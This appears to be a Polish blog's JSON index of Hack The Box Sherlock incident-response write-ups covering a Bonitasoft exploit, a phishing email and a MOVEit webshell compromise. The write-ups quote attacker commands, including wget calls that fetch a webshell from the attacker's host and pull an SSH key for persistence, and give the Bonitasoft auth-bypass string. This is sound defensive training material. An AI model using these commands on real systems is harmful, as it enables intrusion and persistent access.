
[{"content":"","date":"15 września 2025","externalUrl":null,"permalink":"/CyberZgroza/","section":"","summary":"","title":"","type":"page"},{"content":"","date":"15 września 2025","externalUrl":null,"permalink":"/CyberZgroza/tags/dfir/","section":"Tags","summary":"","title":"DFIR","type":"tags"},{"content":"Kolejny zadanie z DFIR. Mamy przeanalizować logi oraz plik PCAP, czyli zrzut ruchu sieciowego. Scenariusz wygląda następująco: As a fast-growing startup, Forela has been utilising a business management platform. Unfortunately, our documentation is scarce, and our administrators aren't the most security aware. As our new security provider we'd like you to have a look at some PCAP and log data we have exported to confirm if we have (or have not) been compromised.\nUruchamiamy maszynę wirtualną Kali Linux i wypakowujemy utworzoną kopię oryginalnego pliku ZIP z dowodami.\nunzip meerkat_copy.zip\nPytanie 1 #\rWe believe our Business Management Platform server has been compromised. Please can you confirm the name of the application running?\nProszą nas o podanie nazwy aplikacji do zarządzania biznesem, uruchomionej na serwerze. Zacznijmy od pliku meerkat-alerts.json. po otwarciu widzimy, że niska czytelność logów utrudni nam dalszą analizę\u0026hellip;\nSkorzystamy z modułu pythona, a konkretnie z json.tool i output zapiszemy w pliku txt. python -m json.tool meerkat-alerts.json \u0026gt; meerkat-alerts-clear.txt\nO wiele lepiej. Po krótkiej analizie znajdujemy ciekawy log:\nWygląda na to, że jakieś narzędzie SIEM wykryło próbę zdobycia uprawnień administratora wykorzystując podatność CVE-2022-25237.\nWygląda na to, że mamy do czynienia z krytyczną podatnością (CVSS:3.1 9.8) aplikacji Bonitasoft - to open-source platforma do zarządzania biznesem. Podatność polega na dodaniu fragmentu ;i18ntranslation na koniec zapytania API w URL. Dzięki temu poprzez aplikację webową Bonita Web, używając domyślnych poświadczeń lub zwykłego użytkownika, jesteśmy w stanie pominąć proces uwierzytelniania i uzyskać dostęp do poufnych endpointów.\nW logach PCAP widzimy dokładny moment wykonania zapytania POST, który uploaduje plik ZIP rce_api_extension.zip - rozszerzenie, które Bonita automatycznie instaluje. Dzięki niemu atakujący ma możliwość wykonania poleceń na serwerze zdalnie. Serwer odpowiada kodem 200, co oznacza że żądanie zostało pomyślnie przetworzone. Widzimy również stringa ;i18ntranslation, które pozwoliło ominąć filtr i uniknąć procesu uwierzytelniania.\nNieco niżej widzimy zapytanie GET. Atakujący wykonał udane zdalne polecenie whoami na serwerze. Zwrócona wartość to root. Nie jest dobrze\u0026hellip;\nNastępnie wykonał zapytanie DELETE, najprawdopodobniej aby usunąć rozszerzenie.\nOdpowiedź: Bonitasoft\nPytanie 2 #\rWe believe the attacker may have used a subset of the brute forcing attack category - what is the name of the attack carried out?\nPrzed uploadem złośliwego rozszerzenia widzimy, że TA próbował wielokrotnie zalogować się do aplikacji webowej - serwer odpowiadał kodem 401 (Unauthorized). Poniżej fragment logów w PCAP i zapytań POST do http://forela[.]co.uk:8080/bonita/loginservice .\nAtakujący próbował wielu kombinacji username\u0026rsquo;a i hasła m.in.\ninstall:install Cyndy.Element@forela[.]co.uk:ybWxct Berny.Ferrarin@foreala[.]co.uk:lPCO6Z Jenilee.Pressma@forela[.]co.uk:3eYwLOKhQEcl Przypominam, że aby eksploit zadziałał, atakujący musi mieć ważną sesję użytkownika - nie musi on mieć jednak specjalnych uprawnień. Stąd ten brute force. Po wielokrotnych próbach TA zalogował się na konto użytkownika seb.broom@forela[.]co.uk za pomocą hasła g0vernm3nt. Zaraz po tym podrzucił złośliwe rozszerzenie.\nNa podstawie tych logów wnioskujemy, że mamy do czynienia z sub-techniką T110.004 (MITRE ATT\u0026amp;CK) należącej do kategorii Brute-Force - Credential Stuffing. Jest to technika polegająca na wykorzystywaniu danych uwierzytelniających, które zostały wcześniej wykradzione lub opublikowane po wycieku danych np. innej firmy. Atakujący wykorzystują fakt, że ludzie korzystają z tych samych credentiali do logowania się do różnych serwisów. Tak więc nie jest to metoda \u0026ldquo;Password Guessing (T110.001)\u0026rdquo;, ponieważ wtedy mielibyśmy najpewniej do czynienia z listą najczęściej wykorzystywanych credentiali (admin, password, dupa123 itd.)\nPoniżej screen z zapytania POST z próbą zalogowania - serwer odpowiada kodem 204 (sukces).\nOdpowiedź: Credential Stuffing\nPytanie 3 #\rDoes the vulnerability exploited have a CVE assigned - and if so, which one?\nNa to pytanie już sobie odpowiedzieliśmy. Jest to CVE-2022-25237.\nOdpowiedź: CVE-2022-25237\nPytanie 4 #\rWhich string was appended to the API URL path to bypass the authorization filter by the attacker\u0026rsquo;s exploit?\nWedług opisu CVE oraz logów w PCAP chodzi o string ;i18ntranslation. Na podstawie opisu w https://rhinosecuritylabs[.]com/application-security/cve-2022-25237-bonitasoft-authorization-bypass/ widzimy, że filtr pozwala na ominięcie uwierzytelniania jeśli w URL znajduje się string /i18ntranslation/../ lub ;i18ntranslation.\nOdpowiedź: ;i18ntranslation\nPytanie 5 #\rHow many combinations of usernames and passswords were used in the credential stuffing attack?\nW pytaniu najpewniej chodzi o unikalne kombinacje username\u0026rsquo;a i hasła. Analizując logi można zobaczyć powtarzającą się kombinację install:install. Odfiltrujmy je za pomocą odpowiedniego filtra w Wireshark http.request.method== \u0026quot;POST\u0026quot; \u0026amp;\u0026amp; http.request.uri contains \u0026quot;/bonita/loginservice\u0026quot; \u0026amp;\u0026amp; not http contains \u0026quot;install\u0026quot;\nSzukamy zapytań POST Szukamy zapytań do endopontu /bonita/loginservice Message body nie zawiera słowa \u0026ldquo;install\u0026rdquo; Mamy już tylko 59 wyników - odejmujemy 3 powtórzone kombinacje `seb.broom@forela[.]co.uk:g0vernm3nt.\nOdpowiedź: 56\nPytanie 6 #\rWhich username and password combination was successful?\nJuż poznaliśmy odpowiedź w pytaniu 2.\nOdpowiedź: `seb.broom@forela[.]co.uk:g0vernm3nt\u0026rsquo;\nPytanie 7 #\rIf any, which text sharing site did the attacker utilise?\nAtakujący wykonał zdalne polecenie wget do strony https://pastes[.]io/raw/bx5gcr0et8\nOdpowiedź: pastes.io\nPytanie 8 #\rPlease provide the filename of the public key used by the attacker to gain persistence on our host.\nPastes[.]io to usługa internetowa, która umożliwia przechowywanie i dzielenie się tekstem w formie pastebin, czyli prostych notatek tekstowych.\nPrzeanalizujmy adres strony, do której chciał się dostać atakujący. Może Virus Total coś pokaże.\nWygląda na to, że domena jest wykorzystywana przez malware typu RAT - Remote Access Trojan. W skrócie to złośliwe oprogramowanie podszywające się pod takie normalne, które jest wykorzystywane do uzyskania zdalnego dostępu. Z informacji wynika, że ASYNCRAT i DCRAT korzystają z domeny. Virus Total oznaczył to m.in. jako phishing. Przeszukajmy internet po więcej informacji.\nNa jednym ze screenów w AnyRun widać, że strona jest wykorzystywana m.in. do udostępniania złośliwego kodu. Atakujący pobrał go i uruchomił na maszynie serwera.\nAtakujący pobiera zawartość za pomocą polecenia curl i zapisuje do pliku authorized_keys, który w Linuxie trzyma klucze publiczne używane do uwierzytelnienia podczas próby uzyskania zdalnego dostępu SSH. W ten sposób atakujący przechodzi do następnego etapu - utrzymanie stałej metody dostępu do serwera (persistence).\nPowyżej widzimy klucz.\nOdpowiedź: hffgra4unv\nPytanie 9 #\rCan you confirm the file modified by the attacker to gain persistence?\nChodzi tu o plik authorized_keys, w którym przetrzymywane są publiczne klucze SSH, aby zalogować się na usera bez podawania hasła.\nOdpowiedź: /home/ubuntu/.ssh/authorized_keys\nPytanie 10 #\rCan you confirm the MITRE technique ID of this type of persistence mechanism?\nOstatnie pytanie dotyczy ID użytej metody z MITRE ATT\u0026amp;CK.\nOdpowiedź: T1098.004\nNa koniec stwórzmy timeline, aby podsumować działania TA.\nData i godzina Opis 19/01/2023 15:31:12 UTC Atakujący (156.146.62.213) uzyskuje dostęp do strony głównej Bonita 19/01/2023 15:31:27 UTC Pierwsza, nieudana próba logowania 19/01/2023 15:35:04 UTC Pierwsze udane logowanie przez TA - użyta kombinacja username:password seb.broom@forela[.]co.uk:g0vernm3nt 19/01/2023 15:35:04 UTC Skuteczne użycie eksploita przez TA - podatność CVE-2022-25237. Upload złośliwego rozszerzenia rce_extension_api.zip 19/01/2023 15:35:05 UTC Zdalne wykonanie polecenia whoami na serwerze ofiary. Opdowiedź - root 19/01/2023 15:38:38 UTC TA wykonuje zdalne polecenie wget https://pastes[.]io/raw/bx5gcr0et8 na serwerze ofiary. Kod zawarty na stronie jest wykonywany i utworzony zostaje nowy klucz publiczny SSH w pliku authorized_keys. Persystencja zdalnego dostępu do serwera przez TA. ","date":"15 września 2025","externalUrl":null,"permalink":"/CyberZgroza/posts/htb_sherlock_meerkat/","section":"Wpisy","summary":"Analiza Sherlocka \u0026ldquo;Meerkat\u0026rdquo; z HTB","title":"Hack The Box Sherlock - meerkat","type":"posts"},{"content":"","date":"15 września 2025","externalUrl":null,"permalink":"/CyberZgroza/tags/htb/","section":"Tags","summary":"","title":"HTB","type":"tags"},{"content":"","date":"15 września 2025","externalUrl":null,"permalink":"/CyberZgroza/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"15 września 2025","externalUrl":null,"permalink":"/CyberZgroza/tags/wireshark/","section":"Tags","summary":"","title":"Wireshark","type":"tags"},{"content":"","date":"15 września 2025","externalUrl":null,"permalink":"/CyberZgroza/posts/","section":"Wpisy","summary":"","title":"Wpisy","type":"posts"},{"content":"Czas na kolejnego sherlocka z HTB - PhishNet. Scenariusz wygląda następująco: An accounting team receives an urgent payment request from a known vendor. The email appears legitimate but contains a suspicious link and a .zip attachment hiding malware. Your task is to analyze the email headers, and uncover the attacker\u0026rsquo;s scheme.\nOszustwa komputerowe były najczęściej występującym rodzajem incydentu w Polsce w 2024. Z raportu CERT za poprzedni rok: Najczęściej występującą kategorią incydentów zarejestrowanych w 2024 roku były oszustwa komputerowe. Zarejestrowano 97 995 tego typu incydentów, co stanowi 95% wszystkich obsłużonych incydentów [...] Najbardziej rozpowszechnionym rodzajem oszustw komputerowych były próby wyłudzania poufnych danych, np. loginu i hasła do poczty, strony banku, portalu społecznościowego czy innej usługi online (ang. phishing). W 2024 roku odnotowano 40 120 takich incydentów, co stanowi 39% wszystkich zarejestrowanych incydentów.\nW tym sherlocku przeanalizujemy nagłówek maila w poszukiwaniu szczegółowych informacji nt. ataku, jego źródła itp.\nOtrzymaliśmy pojedynczy plik .eml do analizy.\nStworzymy testowe konto w Outlooku i przyjrzymy się treści na wirtualnej maszynie Windows 10.\nNadawca: finance@business-finance[.]com Odbiorca: accounts@globalaccounting[.]com\nTematem maila jest niezapłacona faktura na kwotę 4750 zł za jakąś usługę. Przeanalizujmy wstępnie maila:\nJest to mail typu spear-phishing, wycelowany specyficznie w pracownika działu księgowości (Accounting) Atakujący wykorzystuje ludzki błąd poznawczy - heurystykę dostępności. Polega na tym, że ludzie oceniają sytuacje jako bardziej prawdopodobne, jeśli łatwo potrafią sobie przypomnieć podobne przypadki z przeszłości. Pracownik księgowości zapewne miał do czynienia z wieloma niezapłaconymi fakturami w przeszłości i nie zauważył niczego podejrzanego w mailu. Nadawca jest anonimowy - brak imienia i nazwiska. Jest tylko nazwa \u0026ldquo;Finance Department\u0026rdquo; Atakujący stworzył dwie możliwości zarażenia ofiary - poprzez kliknięcie w link (\u0026ldquo;Download Invoice\u0026rdquo;) oraz poprzez manualne pobranie i otworzenie zawartości ZIP-a Atakujący używa strachu i naciska na ofiarę, że jeśli nie wykona czynności w określonym czasie, spotkają ją konsekwencje (\u0026ldquo;Please process the payment immediately to avoid late fees\u0026rdquo;, \u0026ldquo;failure to act may result in penalties or service suspension\u0026rdquo;) Przeanalizujmy plik zip. Obliczmy hash i wrzućmy go do Virus Total.\nFaktycznie mamy do czynienia z plikem ZIP. Zostawmy go na razie i skupmy się na nagłówku maila\nPytanie 1 #\rWhat is the originating IP address of the sender?\nPlik .eml otwieramy za pomocą zwykłego notatnika. Po krótkiej analizie identyfikujemy oryginalny adres IP, z którego wysłano wiadomość.\nInformacje z prefixem X- są dodatkowymi nagłówkami niestandardowymi.\nOdpowiedź: 45.67.89.10\nPytanie 2 #\rWhich mail server relayed this email before reaching the victim?\nPytanie jest od adres IP serwera, który przekierował maila zanim dotarł do odbiorcy.\nAdresy \u0026ldquo;Received\u0026rdquo; są zapisywanie w odwrotnej kolejności tzn. ostatni hop jest na samej górze. from - nadawca by - odbiorca, przez którego mail przeszedł\nKomunikacja wyglądała następująco:\nNadawca Odbiorca Czas finance@business-finance[.]com ([198.51.100.75]) relay.business-finance[.]com ([198.51.100.45]) Mon, 26 Feb 2025 10:05:00 +0000 (UTC) relay.business-finance[.]com ([198.51.100.45]) mail.business-finance[.]com Mon, 26 Feb 2025 10:10:00 +0000 (UTC) mail.business-finance[.]com ([203.0.113.25]) mail.target[.]com Mon, 26 Feb 2025 10:15:00 +0000 (UTC) E-mail trafił do mail.target.com, czyli docelowego serwera pocztowego. My jako odbiorcy widzimy adres \u0026ldquo;From\u0026rdquo; finance@business-finance[.]com. Ten nagłówek jest częścią treści wiadomości i może być modyfikowany przez wysyłającego. Odpowiedź: 203.0.113.25\nPytanie 3 #\rWhat is the sender\u0026rsquo;s email address?\nZnamy już odpowiedź na to pytanie. Wystarczy zobaczyć nagłówek FROM\nOdpowiedź: finance@business-finance[.]com\nPytanie 4 #\rWhat is the \u0026lsquo;Reply-To\u0026rsquo; email address specified in the email?\nAdres e-mail \u0026ldquo;Reply-To\u0026rdquo;, to adres do którego zostanie przekierowana odpowiedź na odebranego maila.\nAtakujący spreparował maila tak, że wszelkie odpowiedzi trafią na adres support@business-finance[.]com\nOdpowiedź: support@business-finance[.]com\nPytanie 5 #\rWhat is the SPF (Sender Policy Framework) result for this email?\nSender Policy Framework to mechanizm uwierzytelniania wiadomości e-mail, który chroni domenę przed spoofingiem. Działa na poziomie komunikacji między serwerami SMTP. Właściciel domeny umieszcza w ustawieniach DNS specjalny rekord SPF, który określa z jakich adresów IP można wysyłać maile z tejże domeny. Gdy serwer odbiorczy SMTP otrzymuje wiadomość, pobiera rekord SPF z DNS domeny nadawcy i sprawdza, czy adres IP nadawcy znajduje się na liście dozwolonych. W przeciwnym razie wiadomość jest odrzucana.\nW tym przypadku serwer SMTP uznaje hosta 45.67.89.10 jako mogący wysyłać maile w imieniu domeny @business-finance.com\nOdpowiedź: Pass\nPytanie 6 #\rWhat is the domain used in the phishing URL inside the email?\nSprawdźmy jaka domena jest używana w adresie URL do pobrania malware\u0026rsquo;u.\nOdpowiedź: secure.business-finance.com\nPytanie 7 #\rWhat is the fake company name used in the email?\nFałszywa nazwa firmy jest na dole maila.\nOdpowiedź: Business Finance Ltd.\nPytanie 8 #\rWhat is the name of the attachment included in the email?\nZałącznikiem jest plik ZIP\nPytanie 9 #\rWhat is the SHA-256 hash of the attachment?\nObliczymy hash pliku za pomocą polecenia w Powershellu Get-FileHash .\\Invoice_2025_Payment.zip -Algorithm SHA256\nOdpowiedź: 8379C41239E9AF845B2AB6C27A7509AE8804D7D73E455C800A551B22BA25BB4A\nPytanie 10 #\rWhat is the filename of the malicious file contained within the ZIP attachment?\nUżyjemy narzędzia strings do wykrycia ciągów znaków w pliku ZIP. Nie jesteśmy w stanie wypakować archiwum.\nOdpowiedź: invoice_document.pdf.bat\nPytanie 11 #\rWhich MITRE ATT\u0026amp;CK techniques are associated with this attack?\nMITRE ATT\u0026amp;CK to ustandaryzowana baza technik wykorzystywanych przez cyberprzestępców wraz z opisami. Każda metoda ma swój unikalny kod identyfikacyjny. My szukamy ataku typu spear phishing.\nOdpowiedź: T1566.001\n","date":"11 września 2025","externalUrl":null,"permalink":"/CyberZgroza/posts/htb_sherlock_phishnet/","section":"Wpisy","summary":"Analiza maila phishingowego - \u0026ldquo;PhishNet\u0026rdquo; z HTB","title":"Hack The Box Sherlock - PhishNet","type":"posts"},{"content":"","date":"11 września 2025","externalUrl":null,"permalink":"/CyberZgroza/tags/phishing/","section":"Tags","summary":"","title":"Phishing","type":"tags"},{"content":"Przyjrzymy się dzisiaj pewnemu incydentowi, który miał miejsce na serwerze Windows. Dostaliśmy następujące informacje:\nWe have unfortunately been hiding under a rock and do not see the many news articles referencing the recent MOVEit CVE being exploited in the wild. We believe our Windows server may be vulnerable and has recently fallen victim to this compromise. We need to understand this exploit in a bit more detail, confirm the actions of the attacker and retrieve some details so that we can implement them into our SOC environment. We have provided you with a triage of all the necessary artefacts from our compromised Windows server. PS: One of the artifacts is a memory dump, but we forgot to include the vmss file. You might have to go back to basics here\u0026hellip;\nNa podstawie wstępnych informacji wynika, że mamy do czynienia z podatnością CVE-2023-34362. To krytyczna podatność (9.8 w CVSS:3.1) typu SQL Injection. Została wykryta w aplikacji MOVEit Transfer, służącej do transferu plików. Pozwala na ich szyforwanie, używa protokołu FTP oraz SFTP i ma funkcje automatyzujące wymianę plików, umożliwia logowanie zdarzeń i raportowanie. Wykorzystanie podatności umożliwia uzyskanie dostępu do bazy danych MOVEit z poziomu aplikacji webowej bez uwierzytelnienia (złamanie poufności), a następnie modyfikację tabel (złamanie integralności) i samego dostępu (złamanie dostępności).\nOtrzymaliśmy plik zip z materiałami\nPlik VMEM (Virtual Memory File) jest dumpem pamięci RAM maszyny wirtualnej, natomiast brakujący plik VMSS (Virtual Machine Suspend State) pozwoliłby na wznowienie maszyny, w dokładnym miejscu gdzie ją wstrzymano.\nOdpalamy naszą maszynę wirtualną Windows 10 i bierzemy się do roboty. Dobrą praktyką jest również stworzyć kopię otrzymanych dowodów - lepiej nie pracować na oryginałach. Sprawdźmy też, czy zachowaliśmy integralność dowodów.\nPytanie 1 #\rName of the ASPX webshell uploaded by the attacker?\nASPX webshell to malware napisany w technologii ASP.NET, który umożliwia zdalne sterowanie serwerem WWW przez atakującego. Korzystając z narzędzia Autopsy znajdujemy plik tekstowy z logami, najpewniej PowerShella. TA (Threat Actor) najprawdopodobniej pobrał webshell \u0026ldquo;move.aspx\u0026rdquo; mając już zdalny dostęp do serwera. Dodatkowo widzimy, że zmienił webshell z moveit.asp na move.aspx. Możliwe, że pierwszy nie działał.\nOdpowiedź: move.aspx\nPytanie 2 #\rWhat was the attacker\u0026rsquo;s IP address?\nPrzeszukajmy pliki w Autopsy po słowie kluczowym move.aspx. Najprawdopodobniej adresem IP TA jest 10.255.254.3, ale spróbujmy uzyskać szerszy kontekst. Sprawdźmy logi w pliku u_ex230712.log\nAdres IP klienta to ponownie 10.255.254.3. Próbował uzyskać dostęp do webshella przez przeglądarkę Firefox. Zanotujmy timestamp. Zauważmy również, że TA próbował eksploitować podatność już wcześniej (podejrzane pliki guestaccess.aspx, moveit.asp, machine2.aspx) jednak move.aspx pojawia się najrzadziej i na końcu logów. Przeszukajmy logi po adresie IP i zobaczmy kiedy nastąpił pierwszy kontakt TA. Jest to ten sam plik u_ex230712.log\n12 lipca o godz. 10:11:15 UTC atakujący rozpoczął skanowanie za pomocą narzędzia Nmap - z tego samego adresu IP 10.255.254.3.\nO godz. 10:21:53 TA wysłał żądanie POST do webshella (możliwe, że jakąś komendę, którą wykonał). Serwer zwrócił kod 200. Charakterystyczne dla zapytań POST jest to, że przekazane parametry nie są logowane (chyba, że skonfigurowano inaczej). Wiemy jedynie, że coś przekazano do pliku webshella.\nMamy kolejną odpowiedź!\nOdpowiedź: 10.255.254.3\nPytanie 3 #\rWhat user agent was used to perform the initial attack?\nUser agent to informacja wysyłana przez klienta w nagłówku HTTP do serwera. Zawiera dane o m.in. używanej przeglądarce, systemie operacyjnym. Widzimy podejrzany ruch wskazujący na użycie skryptu napisanego w Ruby - możliwe, że TA używa Frameworka Metasploit do wykonywania ataku.\nOdpowiedź: Ruby\nPytanie 4 #\rWhen was the ASPX webshell uploaded by the attacker?\nAby zobaczyć kiedy plik został umieszczony na serwerze skorzystamy z odnalezionego pliku bazodanowego $MFT, który zawiera informacje o wszystkich plikach i katalogach systemu - kiedy były tworzone, modyfikowane, zmieniane uprawnienia. Skorzystamy z jednego ze świetnych open-sourcowych narzędzi Erica Zimmermana, znanego amerykańskiego informatyka śledczego, w przeszłości pracującego w FBI - MFTECmd. Jego pakiet \u0026ldquo;EZ tools\u0026rdquo; jest dostępny na GitHubie i służy do analizowania plików/logów Windowsa. Wyeksportujemy plik do CSV i przeanalizujemy zawartość.\n.\\MFTECmd.exe -f \u0026#34;\u0026lt;lokalizacja $MFT\u0026gt;\u0026#34; --csv \u0026#34;\u0026lt;lokalizacja docelowa pliku CSV\u0026gt;\u0026#34; --csvf \u0026lt;nazwa\u0026gt;.csv Szukamy słowa kluczowego \u0026ldquo;move.aspx\u0026rdquo; i znajdujemy dokładną datę - 12.07.2023 11:24:30. Został utworzony w .\\MOVEitTransfer\\wwwroot\nOdpowiedź: 12.07.2023 11:24:30\nPytanie 5 #\rThe attacker uploaded an ASP webshell which didn\u0026rsquo;t work, what is its filesize in bytes?\nWróćmy do pliku ConsoleHost_history.txt. TA próbował uploadować plik moveit.asp, ale później wgrał move.aspx - ten pierwszy nie działał, co potwierdzają poniższe logi z pliku u_ex230712.log i kod 404. Move.aspx zwrócił kod 200 (sukces).\nwielkość niedziałającego pliku moveit.asp jest widoczna w $MFT\nOdpowiedź: 1362\nPytanie 6 #\rWhich tool did the attacker use to initially enumerate the vulnerable server?\nOdpowiedź już znamy po wcześniejszej analizie.\nOdpowiedź: Nmap\nPytanie 7 #\rWe suspect the attacker may have changed the password for our service account. Please confirm the time this occurred (UTC)\nJednym z cennych plików, które otrzymaliśmy do analizy to dziennik zdarzeń Windowsa, a konkretnie Security.evtx. Filtrujemy logi po Event ID 4723 - An attempt was made to change an account\u0026rsquo;s password. Niestety nic nie ma.\nSpróbujmy poszukać po Event ID 4724 - An attempt was made to reset an account\u0026rsquo;s password. Mamy 8 logów z czego najpóźniejszy jest specyficzny - konto usługowe \u0026ldquo;moveitsvc\u0026rdquo; zmieniło własne hasło - jest to najprawdopodobniej skompromitowane przez atakującego konto. Mamy kolejną odpowiedź.\nOdpowiedź: 12/07/2023 11:09:27\nPytanie 8 #\rWhich protocol did the attacker utilize to remote into the compromised machine?\nPonownie użyjemy jednego z narzędzi EZ Tools. EvtxECmd pozwoli nam na eksportowanie dziennika do pliku csv tylko z logami zdarzeń 4624, 4625, 4778, 4779.\n4624 - An account was successfully logged on 4625 - An account failed to log on 4778 - A session was reconnected to a Window Station 4779 - A session was disconnected from a Window Station\nSprawdzimy wszelkie zdarzenia związane z logowaniem na konto w Windows.\nFiltrujemy po Logon Type 10 - user logged on to this computer remotely using Terminal Services or Remote Desktop (dokumentacja Microsoft)\nPotwierdzamy, że logowanie miało miejsce. Host TA (10.255.254.3) logował się na konto moveitsvc przez RDP.\nOdpowiedź: RDP\nPytanie 9 #\rPlease confirm the date and time the attacker remotely accessed the compromised machine?\nCo ciekawe z jakiegoś powodu te same zdarzenia różnią się 1 sekundą - w pliku CSV jest to 11:11:19, a w Event Viewer to 11:11:18. Ta druga jest najwyraźniej poprawna dla HTB.\nOdpowiedź: 12.07.2023 11:11:18\nPytanie 10 #\rWhat was the useragent that the attacker used to access the webshell?\nWiemy, że użytym webshellem jest \u0026ldquo;move.aspx\u0026rdquo;. Wracamy do pliku u_ex230712.log i szukamy słowa kluczowego.\nTA korzystał z graficznego środowiska okien X11, 64-bitowego systemu Linux, silnika renderującego Gecko (na której opiera się Firefox) w wersji 102.0 i przeglądarki Firefox w wersji 102.0\nSwoją drogą, zastanawialiście się czasami czemu w nagłówkach HTTP jest Mozilla/5.0, mimo że klient nie był Firefoxem a np. Chrome? Okazuje się, że jest to relikt lat 90. i \u0026ldquo;wojen przeglądarkowych\u0026rdquo;. W Internecie wtedy królował Netscape Navigator, który wspierał tzw. ramki. Ogólnie pozwalały podzielić stronę internetową na kilka części, z których każda wyświetlała osobny plik HTML. Dzięki temu twórcy stron mogli przygotować jeden plik zawierający menu z odnośnikami do podstron i załadować go w każdej stronie jako osobną stałą sekcję. W ten sposób, zamiast powielać kod menu w każdym pliku, wystarczyło zmienić tylko ten jeden plik z menu, a aktualizacja pojawiała się automatycznie na wszystkich podstronach. Były to czasy, gdy standardy dopiero raczkowały, a przeglądarki internetowe znacząco się od siebie różniły. W związku z tym narodziła się praktyka tzw. user agent sniffing - przeglądarki wysyłały w nagłówku HTTP informacje o sobie, a serwery na tej podstawie odsyłały odpowiednią wersję kodu HTML strony, aby zoptymalizować jej wyświetlanie na konkretnej przeglądarce.\nPrzeglądarka Netscape, będąca wówczas liderem rynku, identyfikowała się jako \u0026ldquo;Mozilla\u0026rdquo; - nazwa ta pochodziła od połączenia słów Mosaic (pierwsza popularna graficzna przeglądarka) i Godzilla. W tym samym czasie Microsoft wprowadził Internet Explorer, również obsługujący ramki - jednak ze względu na jego małą popularność, wiele serwerów nie rozpoznawało go jako przeglądarki zdolnej do obsługi nowoczesnych funkcji. W efekcie użytkownicy Internet Explorera otrzymywali uproszczone wersje stron lub takie, które nie działały poprawnie.\nMicrosoft zdecydował się na kontrowersyjny krok - Internet Explorer również zaczął wysyłać w nagłówku identyfikator \u0026ldquo;Mozilla\u0026rdquo;. Dzięki temu serwery „myślały”, że mają do czynienia z przeglądarką Netscape i przesyłały pełną wersję strony. Wkrótce inne przeglądarki poszły tą samą drogą, co sprawiło, że do dziś w nagłówkach User-Agent znaleźć można odwołanie do \u0026ldquo;Mozilli\u0026rdquo;, niezależnie od faktycznej przeglądarki.\nOdpowiedź: Mozilla/5.0+(X11;+Linux+x86_64;+rv:102.0)+Gecko/20100101+Firefox/102.0\nPytanie 11 #\rWhat is the inst ID of the attacker?\nJednym z plików, które otrzymaliśmy jest zestaw instrukcji SQL. Uruchomimy lokalny serwer SQL i sprawdzimy zawartość.\nSprawdzimy tabelę \u0026ldquo;log\u0026rdquo;\nWidzimy utworzone konta gościa oraz adres IP atakującego.\nOdpowiedź: 1234\nPytanie 12 #\rWhat command was run by the attacker to retrieve the webshell?\nWróćmy do pliku ConsoleHost_history.txt - widzimy, że TA po uzyskaniu zdalnego dostępu wykonał polecenie wget, aby dostać się do webshella.\nOdpowiedź: wget http://10.255.254.3:9001/move.aspx -OutFile move.aspx\nPytanie 13 #\rWhat was the string within the title header of the webshell deployed by the TA?\nPrzeszukajmy dump pamięci RAM .vmem. Niestety nie mamy pliku .vmss, a bez tego Volatility 3 nie zadziała. Zdecydowałem się więc na użycie strings.exe z pakietu Sysinternals Windowsa.\n.\\strings.exe C:\\Users\\analyst\\Desktop\\iliketo\\I-like-to-27a787c5.vmem | Select-String -Pattern \u0026quot;\u0026lt;title\u0026gt;\u0026quot; -Context 20,20\nPolecenie przeszuka linijki ze słowem kluczowym oraz 20 linijkami powyżej i poniżej, dla szerszego kontekstu. Po analizie po słowie \u0026ldquo;title\u0026rdquo; mamy odpowiedź.\nOdpowiedź: awen asp.net webshell\nPytanie 14 #\rWhat did the TA change the our moveitsvc account password to?\nPonownie poszukamy odpowiedzi w dumpie RAM-u. Skorzystamy ze wskazówki w pytaniu i użyjemy słowa kluczowego moveitsvc. Przeniesiemy się też na Kali Linuxa (WSL), ponieważ z jakichś powodów strings z Sysinternals nie mi wypluwał żadnych wyników.\nstrings I-like-to-27a787c5.vmem | grep moveitsvc \u0026gt; moveitsvc-result.txt\nPo dłuższych poszukiwaniach na samym końcu pliku mamy to czego chcieliśmy\nTA użył narzędzia net.\nOdpowiedź: 5trongP4ssw0rd\nPodsumowanie #\rNa koniec uporządkujmy działania TA odtwórzmy po kolei zdarzenia.\nData i godzina Opis 12/07/2013 10:11:15 TA rozpoczął skanowanie narzędziem Nmap 12/07/2023 10:21:53 Pierwsza próba wykorzystania podatności i użycia webshella - POST do /machine2.aspx 12/07/2023 11:09:27 Zmiana hasła konta usługowego \u0026ldquo;moveitsvc\u0026rdquo; przez TA 12.07.2023 11:11:18 Uzyskanie zdalnego dostępu do hosta przez TA (RDP na konto moveitsvc) 12/07/2023 11:18:36 Nieudana próba uzyskania dostępu do webshella moveit.asp 12/07/2023 11:24:30 Upload nowego webshella move.aspx do .\\MOVEitTransfer\\wwwroot 12/07/2023 11:24:47 Wykonanie zapytania POST do endpointu /move.aspx ","date":"7 września 2025","externalUrl":null,"permalink":"/CyberZgroza/posts/htb_sherlock_intro_to_blue_4/","section":"Wpisy","summary":"Analiza Sherlocka \u0026ldquo;i-like-to\u0026rdquo; z HTB","title":"Hack The Box Sherlock - i-like-to","type":"posts"},{"content":"","date":"7 września 2025","externalUrl":null,"permalink":"/CyberZgroza/tags/windows/","section":"Tags","summary":"","title":"Windows","type":"tags"},{"content":"W ostatniej części miniserii o tworzeniu podstawowego SIEM-a przyjrzymy się szczegółom Security Onion oraz postawimy go w utworzonym labie.\nO Security Onion słów kilka #\rSecurity Onion można w dużym skrócie określić jako Kali Linux, tyle że dla Blue Teamu. W 2009 projekt został udostępniony publicznie za darmo przez Douga Burksa, weterana sił powietrznych Stanów Zjednoczonych. Security Onion jest darmową, open-source dystrybucją Linuxa, w której skład wchodzą preinstalowane narzędzia do m.in. intrusion prevention \u0026amp; detection, monitorowania ruchu sieciowego, łatwego zbierania, zarządzania i analizowania logów, threat huntingu. Do ważnych funkcjonalności należą również:\nłatwy i szybki deploy analiza logów usług w chmurze korelacja zdarzeń dashboardy możliwość integracji z EDR (Endpoint Detection \u0026amp; Response) możliwość tworzenia case\u0026rsquo;ów Gotowy Playbook, czyli zestaw reguł i instrukcji pomagających szybciej zidentyfikować i zniwelować zagrożenie W arsenale security onion znajdziemy m.in.:\nSuricata - NIDS \u0026amp; NIPS, służy do wykrywania oraz blokowania szkodliwego ruchu sieciowego na podstawie sygnatur Zeek - narzędzie do monitorowania ruchu sieciowego, zapewnia bardziej szczegółowe logi o przesłanych pakietach m.in. protokoły, żądania, sesje, pliki. Nie działa na podstawie sygnatur jak Suricata, ale w połączeniu dają pełniejszy obraz podejrzanego ruchu sieciowego Strelka - system skanowania i analizy plików. Jego głównym zadaniem jest przetwarzanie plików 